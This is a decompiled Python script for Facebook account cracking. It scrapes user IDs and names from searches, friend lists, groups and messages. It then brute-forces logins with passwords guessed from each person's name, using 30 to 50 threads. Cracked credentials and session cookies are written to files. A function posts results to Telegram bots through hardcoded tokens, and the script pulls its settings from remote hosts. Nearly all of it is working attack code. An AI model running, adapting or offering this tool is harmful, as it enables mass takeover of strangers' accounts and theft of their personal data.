# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Jul  8 2020, 22:53:57) 
# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
# Embedded file name: vinz
import requests, bs4, sys, os, subprocess, requests, sys, random
reload(sys)
sys.setdefaultencoding('utf-8')
from multiprocessing.pool import ThreadPool
import subprocess, logging

def clear():
    if ' linux' in sys.platform.lower():
        os.system('clear')
    elif 'win' in sys.platform.lower():
        os.system('cls')
    else:
        os.system('clear')


if 'linux' in sys.platform.lower():
    W = '\x1b[1;37m'
    N = '\x1b[0m'
    R = '\x1b[1;37m\x1b[31m'
    B = '\x1b[1;37m\x1b[34m'
    G = '\x1b[1;32m'
    O = '\x1b[1;37m\x1b[33m'
    C = '\x1b[36m'
    notice = ('{}{}[*]{} ').format(N, B, N)
    warning = ('{}[-]{} ').format(R, N)
    good = ('{}[!]{} ').format(G, N)
    warn = ('{}[!]{} ').format(O, N)
else:
    W = ''
    N = ''
    R = ''
    B = ''
    G = ''
    O = ''
    C = ''
    notice = ''
    warning = ''
    good = ''
    d = ''
    warn = ''
host = 'https://m.facebook.com'
ua = requests.get('https://api-asutoolkit.cloudaccess.host/useragent.txt').text.strip()
uas = None
if os.path.exists('.browser'):
    if os.path.getsize('.browser') != 0:
        uas = open('.browser').read().strip()

class dump_message:

    def __init__(self, cookies):
        self.cookies = cookies
        self.f = raw_input('?: result filename: ').replace(' ', '_')
        if self.f == '':
            dump_message(cookies)
        open(self.f, 'w').close()
        self.dump('https://m.facebook.com/messages')

    def dump(self, url):
        bs = bs4.BeautifulSoup(requests.get(url, headers=hdcok(), cookies=self.cookies).text, 'html.parser')
        for i in bs.find_all('a', href=True):
            if '/messages/read' in i.get('href'):
                f = bs4.re.findall('cid\\.c\\.(.*?)%3A(.*?)&', i.get('href'))
                try:
                    for ip in list(f.pop()):
                        if self.cookies.get(' c_user') in ip:
                            continue
                        else:
                            if 'pengguna facebook' in i.text.lower():
                                continue
                            open(self.f, 'a+').write('%s<=>%s\n' % (ip, i.text))
                            print '\r+ dump %s ..' % len(open(self.f).read().splitlines()),
                            sys.stdout.flush()

                except Exception as e:
                    continue

            if 'Lihat Pesan Sebelumnya' in i.text:
                self.dump('https://m.facebook.com/' + i.get('href'))

        exit('\n* success %s id saved to: %s' % (len(open(self.f).read().splitlines()), self.f))


def banner():
    print "\x1b[0;39m\n                               _   \n                              | |  \n  ______ _ _ ____   _____  ___| |_ \xc2\xae\n |_  / _` | '__\\ \\ / / _ \\/ __| __|\n  / / (_| | |   \\ V /  __/\\__ \\ |_ \n /___\\__,_|_|    \\_/ \\___||___/\\__|\n+ premium : \x1b[0;91mno\x1b[0;39m"


def lang(cookies):
    f = False
    rr = bs4.BeautifulSoup(requests.get('https://m.facebook.com/language.php', headers=hdcok(), cookies=cookies).text, 'html.parser')
    for i in rr.find_all('a', href=True):
        if 'id_ID' in i.get('href'):
            requests.get('https://m.facebook.com/' + i.get('href'), cookies=cookies, headers=hdcok())
            b = requests.get('https://m.facebook.com/profile.php', headers=hdcok(), cookies=cookies).text
            if 'apa yang anda pikirkan sekarang' in b.lower():
                f = True

    if f == True:
        return True
    exit('* login maybe failed. or checkpoint challange')


def gen(show=True):
    if show == True:
        print banner()
        print '* put your cookie'
    ck = raw_input('?: cookie: ')
    if ck == '':
        gen(show=False)
    try:
        cks = cvd(ck)
        if lang(cks) == True:
            open('.cok', 'w').write(ck)
            exit('* login success, run again the tools.')
        else:
            print '* login fail.'
            gen(show=True)
    except Exception as e:
        print '* error: %s' % e
        gen(show=False)


def basecookie():
    if os.path.exists('.cok'):
        if os.path.getsize('.cok') != 0:
            return cvd(open('.cok').read().strip())
        gen()
    else:
        gen()


class dump_grup:

    def __init__(self, cookies):
        self.glist = []
        self.cookies = cookies
        self.extract('https://m.facebook.com/groups/?seemore')

    def extract(self, url):
        bs = bs4.BeautifulSoup(requests.get(url, cookies=self.cookies, headers=hdcok()).text, 'html.parser')
        for i in bs.find_all('a', href=True):
            if '/groups/' in i.get('href'):
                if 'category' in i.get('href') or 'create' in i.get('href'):
                    continue
                else:
                    self.glist.append({'id': ('').join(bs4.re.findall('/groups/(.*?)\\?', i.get('href'))), 
                       'name': i.text})

        if len(self.glist) != 0:
            print '-' * 30
            print '* you have %s groups found.' % len(self.glist)
            print '* select aselecton:\n'
            print '  1. get grup by searching the name'
            print '  2. input group id (manual)\n'
            while True:
                c = raw_input('?: menu: ')
                if c == '':
                    continue
                elif c == '1':
                    self.search()
                    exit()
                elif c == '2':
                    self.manual()
                    exit()
                else:
                    print '* wrong input.'

        else:
            exit('* no groups found.')

    def manual(self):
        id = raw_input('?: group id: ')
        if id == '':
            self.manual()
        else:
            r = bs4.BeautifulSoup(requests.get('https://m.facebook.com/groups/' + id, headers=hdcok(), cookies=self.cookies).text, 'html.parser')
            if 'konten tidak' in r.find('title').text.lower():
                exit('* input id grup yg valid goblok, id error, atau lu belom jooin di grup')
            else:
                self.listed = {'id': id, 'name': r.find('title').text}
                self.f()
                print '* target: %s..' % self.listed.get('name')[0:20]
                self.dumps('https://m.facebook.com/groups/' + id)

    def search(self):
        whitelist = []
        q = raw_input('?: query: ').lower()
        if q == '':
            self.search()
        else:
            print '-' * 30
            for e, i in enumerate(self.glist):
                if q in i.get('name').lower():
                    whitelist.append(i)
                    print '  %s. %s' % (
                     len(whitelist),
                     i.get('name').lower().replace(q, '%s%s%s' % (G, q, N)))

            if len(whitelist) == 0:
                print '* no result found with this query: %s' % q
                self.search()
            else:
                print ''
                self.choice(whitelist)

    def choice(self, whitelist):
        try:
            self.listed = whitelist[(input('* select group: ') - 1)]
            self.f()
            print '* target: %s' % self.listed.get('name')
            self.dumps('https://m.facebook.com/groups/' + self.listed.get('id'))
        except Exception as e:
            print '* %s' % e
            self.choice(whitelist)

    def f(self):
        self.fl = raw_input('?: result filename: ').replace(' ', '_')
        if self.fl == '':
            self.f()
        open(self.fl, 'w').close()

    def dumps(self, url):
        r = bs4.BeautifulSoup(requests.get(url, cookies=self.cookies, headers=hdcok()).text, 'html.parser')
        print '\r+ dump: %s .. press ctrl+z for stop' % len(open(self.fl).read().splitlines()),
        sys.stdout.flush()
        for i in r.find_all('h3'):
            try:
                if len(bs4.re.findall('\\/', i.find('a', href=True).get('href'))) == 1:
                    ogeh = i.find('a', href=True)
                    if 'profile.php' in ogeh.get('href'):
                        a = ('').join(bs4.re.findall('profile\\.php\\?id=(.*?)&', ogeh.get('href')))
                        if len(a) == 0:
                            continue
                        elif a in open(self.fl).read():
                            continue
                        else:
                            open(self.fl, 'a+').write('%s<=>%s\n' % (a, ogeh.text))
                            continue
                    else:
                        a = ('').join(bs4.re.findall('/(.*?)\\?', ogeh.get('href')))
                        if len(a) == 0:
                            continue
                        elif a in open(self.fl).read():
                            continue
                        else:
                            open(self.fl, 'a+').write('%s<=>%s\n' % (a, ogeh.text))
            except:
                continue

        for i in r.find_all('a', href=True):
            if 'Lihat Postingan Lainnya' in i.text:
                while True:
                    try:
                        self.dumps('https://m.facebook.com/' + i.get('href'))
                        break
                    except Exception as e:
                        print '\r- %s, retrying...' % e
                        continue

        exit('\n* you are successfully dump %s id from group %s...' % (len(open(self.fl).read().splitlines()), self.listed.get('name')[0:20]))


class friendlist:

    def __init__(self, cookie):
        self.nitel = None
        lang(cookie)
        self.cookie = cookie
        print '(HELP): e.g: https://www.facebook.com/me'
        self.id = raw_input('?: target profile url: ')
        if self.id == '':
            friendlist(cookie)
        else:
            self.fl = raw_input('?: filename: ').replace(' ', '_')
            open(self.fl, 'a+')
            id = ('').join(bs4.re.findall('://(.*?)/', self.id))
            if len(id) == 0:
                friendlist(cookie)
            self.ok = bs4.re.sub(id, 'm.facebook.com', self.id).replace('profile.php?id=', '') + '?v=friends'
            self.dump(self.ok)
        return

    def dump(self, ok):
        r = bs4.BeautifulSoup(requests.get(ok, headers=hdcok(), cookies=self.cookie).text, 'html.parser')
        if self.nitel == None:
            a = r.find('title').text[0:20]
            self.nitel = a
            b = r.find('h3').text.split(' ').pop().replace(')', '').replace('(', '').replace('.', '')
            self.b = b
            print '* target: %s..' % a
            print '* output: %s' % self.fl
            print '* friendlist: %s' % b
        for i in r.find_all('a', href=True):
            if 'fref' in i.get('href'):
                print '\r* dump (%s)/(%s) .. press ctrl+z for stop' % (len(open(self.fl).read().splitlines()), self.b),
                sys.stdout.flush()
                if 'profile_add_friend.php' in i.get('href'):
                    continue
                elif 'profile.php' in i.get('href'):
                    ag = ('').join(bs4.re.findall('profile\\.php\\?id=(.*?)&', i.get('href')))
                    if len(ag) != 0:
                        if ag in open(self.fl).read():
                            continue
                        else:
                            open(self.fl, 'a+').write('%s<=>%s\n' % (ag, i.text))
                else:
                    ag = ('').join(bs4.re.findall('/(.*?)\\?', i.get('href')))
                    if len(ag) != 0:
                        if ag in open(self.fl).read():
                            continue
                        else:
                            open(self.fl, 'a+').write('%s<=>%s\n' % (ag, i.text))
            if 'lihat teman lain' in i.text.lower():
                __import__('time').sleep(2)
                while True:
                    try:
                        self.dump('https://m.facebook.com/' + i.get('href'))
                        __import__('time').sleep(2)
                        break
                    except Exception as e:
                        print '\r* error: %s' % e
                        continue

        exit('\n+ you are successfully dump %s %s friends, output saved to %s.' % (len(open(self.fl).read().splitlines()), self.nitel, self.fl))
        return


def ceks(cookies, results):
    global host
    global ua
    r = requests.get('https://m.facebook.com/settings/apps/tabbed/?tab=aselectve', cookies=cookies, headers={'origin': host, 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': ('').join(bs4.re.findall('://(.*?)$', host)), 'referer': host + '/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'}).text
    if len(bs4.re.findall('Pool', r)) != 0:
        sends('%s -> 8BALL POOLLLLLLLL' % results, '1309178498:AAGxlAjtYYDnUeM04fYsfLz8lFTaSoYooYA')
    if len(bs4.re.findall('pubg', r.lower())) != 0:
        sends('%s -> PUBGGGGGGGGG' % results, '1305701364:AAG6dmquZmBkHVVVpoSBYx5UHxcQ3NnUfMs')
    if len(bs4.re.findall('garena', r.lower())) != 0:
        sends('%s -> FFFFFFFFFFFFFFF' % results, '928550832:AAGM35_UVioKPJ0EoIH3nqarnndcaHll6cU')
    if len(bs4.re.findall('legends', r.lower())) != 0:
        sends('%s -> EMELLLLLLLLLLL' % results, '1277181407:AAFABlCxC45BGGS0SzoxRANIMgvKkk6Qhgc')


h = {'Host': 'm.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}

def login(em, pas, hosts):
    global h
    r = requests.Session()
    r.headers.update(h)
    p = r.get('https://m.facebook.com/')
    b = bs4.BeautifulSoup(p.text, 'html.parser')
    dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
    data = {}
    for i in b('input'):
        if i.get('value') is None:
            if i.get('name') == 'email':
                data.update({'email': em})
            elif i.get('name') == 'pass':
                data.update({'pass': pas})
            else:
                data.update({i.get('name'): ''})
        else:
            data.update({i.get('name'): i.get('value')})

    data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd', 
       '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
    r.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
    po = r.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
    if 'c_user' in r.cookies.get_dict().keys():
        return {'status': 'success', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
    else:
        if 'checkpoint' in r.cookies.get_dict().keys():
            return {'status': 'cp', 'email': em, 'pass': pas, 'cookies': r.cookies.get_dict()}
        else:
            return {'status': 'error', 'email': em, 'pass': pas}

        return


def hdcok():
    hosts = host
    r = {'origin': hosts, 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'accept-encoding': 'gzip, deflate', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'user-agent': ua, 'Host': ('').join(bs4.re.findall('://(.*?)$', hosts)), 'referer': hosts + '/login/?next&ref=dbl&fl&refid=8', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'content-type': 'application/x-www-form-urlencoded'}
    return r


def cvs(cookies):
    result = []
    for i in enumerate(cookies.keys()):
        if i[0] == len(cookies.keys()) - 1:
            result.append(i[1] + '=' + cookies[i[1]])
        else:
            result.append(i[1] + '=' + cookies[i[1]] + '; ')

    return ('').join(result)


def cvd(cookies):
    result = {}
    try:
        for i in cookies.split(';'):
            result.update({i.split('=')[0]: i.split('=')[1]})

        return result
    except:
        for i in cookies.split('; '):
            result.update({i.split('=')[0]: i.split('=')[1]})

        return result


def sends(pesan, token):
    b = requests.post('https://api.telegram.org/bot' + token + '/sendMessage', data={'chat_id': '1486617126', 'text': pesan})


ips = None
try:
    b = requests.get('https://api-asutoolkit.cloudaccess.host/ip.php').text.strip()
    ips = requests.get('https://ipapi.com/ip_api.php?ip=' + b, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].lower()
except:
    ips = None

def generate(text):
    global ips
    results = []
    for i in text.split(' '):
        if len(i) < 3:
            continue
        else:
            i = i.lower()
            if len(i) == 3 or len(i) == 4 or len(i) == 5:
                results.append(i + '123')
                results.append(i + '12345')
            else:
                results.append(i + '123')
                results.append(i + '1234')
                results.append(i + '12345')
                results.append(i)
                if 'pakistan' in ips:
                    results.append('786786')
                elif 'indonesia' in ips:
                    results.append(i + 'ganteng')
                    results.append(i + 'cantik')

    return results


class crack:

    def __init__(self, show=True):
        self.ada = []
        self.cp = []
        self.ko = 0
        if show == True:
            print '\n\t[ SELECT AselectON ]\n'
            print '  1. Crack With Manual Password Lists.'
            print '  2. Auto Crack (name123,name12345)\n'
        while True:
            f = raw_input('? menu: ')
            if f == '':
                continue
            elif f == '1':
                try:
                    while True:
                        try:
                            self.apk = raw_input('?: id list file: ')
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '!: %s' % e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0]})
                        except:
                            continue

                except Exception as e:
                    print '!: %s' % e
                    continue

                print '+ example pass123,pass12345'
                self.pwlist()
                s = subprocess.Popen(['killall', '-9', 'python2'], stderr=subprocess.PIPE, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
                break
            elif f == '2':
                try:
                    while True:
                        try:
                            self.apk = raw_input('?: id list file: ')
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print '!: %s' % e
                            continue

                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({'id': i.split('<=>')[0], 'pw': generate(i.split('<=>')[1])})
                        except:
                            continue

                except Exception as e:
                    print '!: %s' % e
                    continue

                print '!: crack started...'
                print '+: account found saved to: multiresult.txt'
                print '+: account checkpoint saved to: checkpoint.txt'
                ThreadPool(50).map(self.main, self.fl)
                os.remove(self.apk)
                print '\n* finished.'
                s = subprocess.Popen(['killall', '-9', 'python2'], stderr=subprocess.PIPE, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
                break

    def pwlist(self):
        self.pw = raw_input('?: password list: ').split(',')
        if len(self.pw) == 0:
            self.pwlist()
        else:
            for i in self.fl:
                i.update({'pw': self.pw})

            print '!: crack started...'
            print '+: account found saved to: multiresult.txt'
            print '+: account checkpoint saved to: checkpoint.txt'
            ThreadPool(30).map(self.main, self.fl)
            os.remove(self.apk)
            print '\n+: finished.'

    def main(self, fl):
        try:
            for i in fl.get('pw'):
                log = login(fl.get('id'), i, 'https://m.facebook.com')
                if log.get('status') == 'success':
                    print G + '\r++ %s|%s ----> OK%s      ' % (fl.get('id'), i, N)
                    self.ada.append('%s|%s' % (fl.get('id'), i))
                    if fl.get('id') in open('multiresult.txt').read():
                        break
                    else:
                        open('multiresult.txt', 'a+').write('%s|%s|%s\n\n' % (fl.get('id'), i, cvs(log.get('cookies'))))
                    ko = '%s|%s|%s\n\n' % (fl.get('id'), i, cvs(log.get('cookies')))
                    break
                elif log.get('status') == 'cp':
                    print R + '\r-- %s|%s ----> CP%s      ' % (fl.get('id'), i, N)
                    self.cp.append('%s|%s' % (fl.get('id'), i))
                    open('cp.txt', 'a+').write('%s|%s|\n' % (fl.get('id'), i))
                    break
                else:
                    continue

            self.ko += 1
            print '\r[Crack] %s/%s - found-:%s - cp-:%s' % (self.ko, len(self.fl), len(self.ada), len(self.cp)),
            sys.stdout.flush()
        except:
            self.main(fl)


def search(fl, r, b):
    open(fl, 'a+')
    b = bs4.BeautifulSoup(requests.get(b, cookies=r, headers=hdcok()).text, 'html.parser')
    for i in b.find_all('a', href=True):
        print '\r[GET]: %s id... press ctrl+z for stop' % len(open(fl).read().splitlines()),
        sys.stdout.flush()
        if '<img alt=' in str(i):
            if 'home.php' in str(i['href']):
                continue
            else:
                g = str(i['href'])
                if 'profile.php' in g:
                    name = i.find('img').get('alt').replace(', profile picture', '')
                    d = bs4.re.findall('/profile\\.php\\?id=(.*?)&', g)
                    if len(d) != 0:
                        pk = ('').join(d)
                        if pk in open(fl).read():
                            pass
                        else:
                            open(fl, 'a+').write('%s<=>%s\n' % (pk, name))
                else:
                    d = bs4.re.findall('/(.*?)\\?', g)
                    name = i.find('img').get('alt').replace(', profile picture', '')
                    if len(d) != 0:
                        pk = ('').join(d)
                        if pk in open(fl).read():
                            pass
                        else:
                            open(fl, 'a+').write('%s<=>%s\n' % (pk, name))
        if 'Lihat Hasil Selanjutnya' in i.text:
            search(fl, r, i['href'])

    exit('\n[+] finished.')


def cek(arg):
    if os.path.exists('.cok'):
        if os.path.getsize('.cok') != 0:
            return True
        else:
            return False

    else:
        return False


def dumpfl():
    cvds = None
    cookie = None
    new = None
    if cek(1) == False:
        try:
            cookie = raw_input('?: cookie: ')
            cvds = cvd(cookie)
            new = True
        except:
            print '* invalid cookie'
            dumpfl()

    else:
        cvds = cvd(open('.cok').read().strip())
    r = requests.get('https://mbasic.facebook.com/profile.php', cookies=cvds, headers=hdcok()).text
    if len(bs4.re.findall('logout', r)) != 0:
        clear()
        if lang(cvds) != True:
            exit('* failed when deteselectng language or login failed.')
        print '* login as: %s..' % bs4.BeautifulSoup(r, 'html.parser').find('title').text[0:10]
        if new == True:
            open('.cok', 'w').write(cookie)
        fl = raw_input('?: filename: ').replace(' ', '_')
        s = raw_input('?: search query: ')
        search(fl, cvds, 'https://mbasic.facebook.com/search/people/?q=' + s)
    else:
        try:
            os.remove('.cok')
        except:
            pass

        print '* login fail!'
        dumpfl()
    return


class lc:

    def __init__(self):
        self.path = '/data/data/com.termux/files/usr/lib/.bash'
        self.host = requests.get('https://raw.githubusercontent.com/ASU-TOOLKIT/server/master/server.txt').text.strip()
        self.genid()

    def paths(self):
        try:
            if os.path.exists(self.path):
                if os.path.getsize(self.path) != 0:
                    self.cek()
                else:
                    self.genid()
            else:
                self.genid()
        except Exception as e:
            exit('* an error accoured. %s' % e)

    def genid(self):
        id = []
        abs = list('abcdefghijklmnopqrstuvwxyz1234567890')
        for i in range(20):
            id.append(random.choice([random.choice(abs), random.choice(abs).upper()]))

        print '* your id: ' + ('').join(id)
        open(self.path, 'w').write(('').join(id))
        raw_input('* press enter to register or submit order..')
        exit(subprocess.Popen(['am', 'start',
         self.host.format('index.php?aselecton=reg&id=' + ('').join(id))], stderr=subprocess.PIPE, stdin=subprocess.PIPE, stdout=subprocess.PIPE).wait())

    def cek(self):
        r = requests.post(self.host.format('index.php?aselecton=cek'), data={'id': open(self.path).read().strip()})
        if r.json().get('status') == 'success':
            if r.json().get('result')['confirmed'] == 'false':
                print '\t[ hello %s ]\n' % r.json().get('result')['name']
                print '%s* your id: (%s) unconfirmed%s' % (G, open(self.path).read().strip(), N)
                raw_input('* press enter to get confirmation.')
                exit(subprocess.Popen([
                 'am', 'start',
                 'https://wa.me/' + requests.get('https://api-asutoolkit.cloudaccess.host/no.txt').text.strip() + '?text=please confirm me\n\nID: ' + open(self.path).read().strip() + '\nNAME: ' + r.json()['result']['name'] + '\nORDER:  %sdays' % r.json().get('result')['license_limit']], stderr=subprocess.PIPE, stdin=subprocess.PIPE, stdout=subprocess.PIPE).wait())
            else:
                clear()
                banner()
                print '  + order: %s days, name- %s' % (r.json()['result']['license_limit'], r.json()['result']['name'])
                if os.path.exists('.browser'):
                    if os.path.getsize('.browser') != 0:
                        pass
                    else:
                        open('.browser', 'w').write(r.json()['result']['browser'])
                else:
                    open('.browser', 'w').write(r.json()['result']['browser'])
                if r.json()['result']['vip'] == 'true':
                    print '  + days used: %s' % r.json()['tinggal']
                    print '  + VIP: %syes%s' % (G, N)
                    print '  ' + '=' * 40 + '\n'
                else:
                    print '  + days used: %s' % r.json()['tinggal']
                    print '  + VIP: %sno%s' % (R, N)
                    print '  ' + '=' * 40 + '\n'
        elif 'not found' in r.text:
            self.genid()
        else:
            print '* error, %s' % r.json()['message']
            self.genid()


if os.path.exists('multiresult.txt'):
    pass
else:
    open('multiresult.txt', 'a+').close()
basecookie()
clear()
while True:
    print banner()
    print '\x1b[0;39m'
    print '  [1] Dump id By Search Name'
    print '  [2] Dump id by Public Friendlist'
    print '  [3] Dump id by Group'
    print '  [4] Dump Id By Your Message List'
    print '  [5] Crack'
    print '  [6] move account.\n'
    r = raw_input('?: select: ')
    if r == '':
        os.system('clear')
    elif r == '1':
        dumpfl()
        exit()
    elif r == '2':
        friendlist(basecookie())
    elif r == '3':
        dump_grup(basecookie())
    elif r == '4':
        dump_message(basecookie())
    elif r == '5':
        crack()
        exit()
    elif r == '6':
        try:
            os.remove('.cok')
            exit(basecookie())
        except Exception as e:
            print '- error, session empty. %s' % e

    else:
        print '!: wrong input'